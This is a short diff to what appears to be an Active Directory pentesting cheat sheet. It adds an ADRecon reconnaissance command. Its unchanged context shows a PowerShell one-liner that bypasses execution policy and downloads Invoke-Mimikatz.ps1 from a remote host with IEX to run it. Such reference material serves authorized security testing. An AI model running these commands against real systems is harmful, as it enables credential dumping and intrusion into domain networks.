@@ -124,6 +124,12 @@
   powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
   ```
 
+* [ADRecon](https://github.com/sense-of-security/ADRecon)
+
+  ```powershell
+  .\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\myuser
+  ```
+
 * [Active Directory Assessment and Privilege Escalation Script](https://github.com/hausec/ADAPE-Script)
 
     ```powershell
